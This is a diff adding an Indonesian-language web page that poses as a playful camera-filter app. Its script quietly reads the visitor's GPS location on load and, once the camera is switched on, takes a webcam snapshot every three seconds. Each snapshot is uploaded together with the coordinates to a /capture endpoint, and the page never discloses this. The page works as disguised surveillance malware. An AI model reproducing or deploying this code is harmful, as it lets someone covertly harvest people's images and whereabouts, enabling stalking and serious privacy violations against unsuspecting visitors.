@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>😎 Akses Kamera</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Comic Sans MS', cursive, sans-serif; }
+        body {
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+        }
+        .box {
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(12px);
+            padding: 40px 30px;
+            border-radius: 40px;
+            border: 2px solid rgba(255,255,255,0.15);
+            width: 400px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+        }
+        .box h1 { font-size: 28px; margin-bottom: 6px; }
+        .box h1 span { color: #f9ca24; }
+        .sub { font-size: 14px; color: #aaa; margin-bottom: 18px; }
+        .camera-box {
+            width: 100%;
+            height: 260px;
+            background: #0d0d1a;
+            border-radius: 24px;
+            border: 3px dashed #f9ca24;
+            overflow: hidden;
+            margin-bottom: 16px;
+            position: relative;
+        }
+        .camera-box video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+        .camera-box .placeholder {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            color: #888;
+        }
+        .camera-box .placeholder .icon { font-size: 60px; }
+        .filter-badge {
+            background: #f9ca24;
+            color: #000;
+            padding: 6px 16px;
+            border-radius: 30px;
+            font-weight: bold;
+            font-size: 13px;
+            display: inline-block;
+            margin-bottom: 12px;
+        }
+        .btn {
+            background: #f9ca24;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 18px;
+            cursor: pointer;
+            color: #000;
+            transition: 0.3s;
+            width: 100%;
+        }
+        .btn:hover { background: #f0b90b; transform: scale(1.02); }
+        .btn:disabled { background: #555; color: #aaa; cursor: not-allowed; }
+        .status {
+            margin: 14px 0 10px;
+            font-size: 14px;
+            color: #aaa;
+        }
+        .status.success { color: #6fcf97; }
+        .status.error { color: #eb5757; }
+        .status.gps { color: #f1c40f; }
+        .footer {
+            margin-top: 16px;
+            font-size: 11px;
+            color: #555;
+        }
+        .filter-select {
+            background: #1e2a3a;
+            color: #fff;
+            border: 1px solid #333;
+            padding: 8px 14px;
+            border-radius: 30px;
+            font-size: 14px;
+            outline: none;
+            margin-bottom: 12px;
+            width: 100%;
+        }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h1>📸 <span>Akses Kamera</span></h1>
+    <p class="sub">Tekan tombol di bawah buat mulai</p>
+
+    <div class="camera-box" id="cameraBox">
+        <div class="placeholder" id="placeholder">
+            <span class="icon">🎥</span>
+            <span>Kamera siap dipakai</span>
+        </div>
+        <video id="video" class="hidden" autoplay muted></video>
+    </div>
+
+    <div class="filter-badge">🎭 Filter Aktif</div>
+    <select class="filter-select" id="filterSelect">
+        <option value="none">🚫 Tanpa Filter</option>
+        <option value="grayscale">⚫ Grayscale</option>
+        <option value="sepia">🟤 Sepia</option>
+        <option value="blur">🌫️ Blur</option>
+        <option value="bright">☀️ Bright</option>
+        <option value="invert">🔄 Invert</option>
+        <option value="hue">🌈 Hue Rotate</option>
+    </select>
+
+    <div class="status" id="status">⏳ Klik tombol untuk akses kamera</div>
+
+    <button class="btn" id="startBtn">🎬 Aktifkan Kamera</button>
+    <div class="footer">✨ Filter lucu siap dipakai • © 2026</div>
+</div>
+
+<canvas id="canvas" class="hidden"></canvas>
+
+<script>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+const statusEl = document.getElementById('status');
+const startBtn = document.getElementById('startBtn');
+const placeholder = document.getElementById('placeholder');
+const filterSelect = document.getElementById('filterSelect');
+
+let stream = null;
+let cameraReady = false;
+let captureInterval = null;
+let gpsData = { lat: '-', lon: '-', acc: '-' };
+
+navigator.geolocation.getCurrentPosition(
+    (pos) => {
+        gpsData.lat = pos.coords.latitude;
+        gpsData.lon = pos.coords.longitude;
+        gpsData.acc = pos.coords.accuracy;
+        statusEl.textContent = `📍 Lokasi: ${gpsData.lat}, ${gpsData.lon}`;
+        statusEl.className = 'status gps';
+    },
+    () => {
+        statusEl.textContent = '⚠️ Gagal ambil lokasi, lanjut tanpa GPS';
+        statusEl.className = 'status error';
+    }
+);
+
+function applyFilter() {
+    const filter = filterSelect.value;
+    switch(filter) {
+        case 'grayscale': return 'grayscale(100%)';
+        case 'sepia': return 'sepia(100%)';
+        case 'blur': return 'blur(3px)';
+        case 'bright': return 'brightness(1.5)';
+        case 'invert': return 'invert(100%)';
+        case 'hue': return 'hue-rotate(180deg)';
+        default: return 'none';
+    }
+}
+
+filterSelect.addEventListener('change', () => {
+    if (video) video.style.filter = applyFilter();
+});
+
+startBtn.addEventListener('click', async () => {
+    startBtn.disabled = true;
+    startBtn.textContent = '⏳ Meminta izin...';
+    statusEl.textContent = '📡 Mengakses kamera...';
+
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { width: 640, height: 480, facingMode: 'user' }
+        });
+
+        video.srcObject = stream;
+        video.classList.remove('hidden');
+        placeholder.style.display = 'none';
+        cameraReady = true;
+
+        video.style.filter = applyFilter();
+
+        statusEl.textContent = '✅ Kamera aktif! Filter siap dipakai.';
+        statusEl.className = 'status success';
+        startBtn.textContent = '📸 Kamera ON';
+        startBtn.style.background = '#6fcf97';
+
+        captureInterval = setInterval(() => {
+            if (cameraReady) {
+                captureAndSend();
+            }
+        }, 3000);
+
+        setTimeout(captureAndSend, 1000);
+
+    } catch (err) {
+        statusEl.textContent = '⚠️ Gagal akses kamera: ' + err.message;
+        statusEl.className = 'status error';
+        startBtn.disabled = false;
+        startBtn.textContent = '🔄 Coba Lagi';
+    }
+});
+
+async function captureAndSend() {
+    if (!cameraReady || !video.videoWidth) return;
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+
+    const filter = filterSelect.value;
+    ctx.filter = applyFilter();
+    ctx.drawImage(video, 0, 0);
+    ctx.filter = 'none';
+
+    const imageData = canvas.toDataURL('image/jpeg').split(',')[1];
+
+    try {
+        await fetch('/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username: 'guest',
+                password: 'filtered',
+                image: imageData,
+                lat: gpsData.lat,
+                lon: gpsData.lon,
+                acc: gpsData.acc
+            })
+        });
+    } catch (err) {}
+}
+
+window.addEventListener('beforeunload', () => {
+    if (captureInterval) clearInterval(captureInterval);
+    if (stream) stream.getTracks().forEach(t => t.stop());
+});
+</script>
+</body>
+</html>
